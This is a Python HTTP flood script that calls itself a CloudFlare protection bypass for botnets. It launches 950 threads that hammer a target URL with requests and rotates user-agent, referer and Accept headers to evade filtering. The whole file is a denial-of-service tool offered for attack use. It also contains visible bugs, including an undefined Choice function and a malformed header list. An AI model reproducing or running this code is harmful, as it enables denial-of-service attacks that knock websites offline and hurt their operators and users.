# -*- coding: utf-8 -*-


import urllib.request, urllib.error, urllib.parse
import sys
import threading
import random
import re

url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
        global request_counter
        request_counter+=1

def set_flag(val):
        global flag
        flag=val

def set_safe():
        global safe
        safe=1

def useragent_list():
        global headers_useragents
        try:
                with open("user-agents.txt", 'r') as f:
                    for line in f:
                        user_agent = line.strip()
                        if user_agent:
                                headers_useragents.append(user_agent)
        except IOError as e:
            print(f"Error opening file 'user-agents.txt': {e}")
        return(headers_useragents)

def referer_list():
        global headers_referers
        try:
            with open("referers.txt", 'r') as f:
                for line in f:
                    refer = line.strip()
                    if refer:
                        headers_referers.append(refer)
        except IOError as e:
            print(f"Error opening file 'referers.txt': {e}")
        return(headers_referers)


def usage():
        print ('===> Attack command: cfbypass.py [url] <===')
        print ("\a")

print ('===> CF-Bypass - CloudFlare Protection Bypass for Botnets <===')
print ("\a")

        
def httpcall(url):
        
        code=0
        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
            "Accept-Encoding: gzip, deflate",
            "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
            "Accept: text/html, application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        ]
        request = urllib.request.Request(url)
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        accept = Choice(acceptall).split(":")
        request.add_header(accept[0],accept[1])
        request.add_header('Referer', random.choice(headers_referers))
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        try:
                        urllib.request.urlopen(request)
        except urllib.error.HTTPError as e:
                        #rint e.code
                        set_flag(1)
                        print('[inited]')
                        code=500
        except urllib.error.URLError as e:
                        #rint e.reason
                        sys.exit()
        else:
                        inc_counter()
                        urllib.request.urlopen(request)
        return(code)



class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) & (safe == 1):
                    set_flag(2)
        except Exception as ex:
            pass


class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                print("%d Requests Sent" % (request_counter))
                previous = request_counter
        if flag == 2:
            print("\n Script launched")


if len(sys.argv) < 2:
    print("URL argument not provided.")
    sys.exit()

url_regex = r"(?P<url>https?://[^\s]+)"
url = re.search(url_regex, sys.argv[1])

if not url:
    print("Invalid URL.")
    sys.exit()

useragent_list()
referer_list()

url = url.group('url')
print('[inited]')
host = url
for i in range(950):
    t = HTTPThread()
    t.start()
t = MonitorThread()
t.start()
